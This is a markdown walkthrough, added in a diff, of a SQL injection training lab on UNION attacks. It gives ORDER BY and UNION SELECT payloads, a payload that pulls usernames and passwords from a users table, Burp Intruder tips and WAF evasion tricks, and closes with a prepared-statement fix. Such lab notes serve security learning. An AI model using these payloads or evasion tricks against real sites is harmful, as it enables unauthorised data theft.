@@ -1,0 +1,62 @@
+# SQL injection Lab3 : UNION Attack Determining Columns
+
+# Objective
+    Determine the number of columns in a SQL query using UNION attacks to extract data from other tables.
+
+# Burp Suite
+    1.Configure Burp Suite proxy (127.0.0.1:8080)
+    2.Access the lab URL and browse to the vulnerable category page
+    3.Observe the normal request:
+              GET /filter?category=Gifts HTTP/1.1
+
+     4.Identify Injection Point
+         Capture the request in Burp and send to Repeater (Right-click → Send to Repeater)
+     5.Test Column Count Using ORDER BY
+          GET /filter?category=Gifts' ORDER BY 1-- HTTP/1.1
+
+          ORDER BY 2--
+          ORDER BY 3-- 
+          ORDER BY 4--  ← This fails (3 columns total)
+    6.Confirm with UNION SELECT
+          GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
+    7.Find string-compatible columns:
+          GET /filter?category=Gifts' UNION SELECT 'a','b','c'-- HTTP/1.1
+    8.Extract data (example for 3 columns):
+          GET /filter?category=Gifts' UNION SELECT username,password,NULL FROM users-- HTTP/1.1
+  # Tips 
+      Send request to Intruder
+              Set payload position: ORDER BY §1§--
+              Use number payloads (1-10)
+              Grep for "Internal Server Error"
+      Encoding Tricks:
+              Use %20 for spaces if needed
+              Try + as space alternative in URL
+      Response Analysis:
+              500 error = incorrect column count
+              200 with extra data = success
+
+# Perevention
+  String query = "SELECT * FROM products WHERE category = ?";
+  PreparedStatement stmt = connection.prepareStatement(query);
+  stmt.setString(1, category);
+
+# Key
+    Technique: UNION attack vs simple injection
+    Complexity: Requires multiple test requests
+    Outcome: Data extraction vs simple bypass
+
+# Troubleshooting 
+    Try different NULL combinations: NULL,NULL--
+    Test with explicit column types: 'a',123,NULL--
+    Verify you're seeing the UNION results in response
+    Check for WAF blocks (try adding comments between keywords)
+
+# Common Errors
+  "No results" after UNION:
+       - Try `UNION ALL SELECT` instead
+       - Ensure same data types in columns
+
+    WAF blocking:
+       - Add comments between keywords: `UN/**/ION SEL/**/ECT`
+       - Use mixed case: `UnIoN SeLeCt`
+
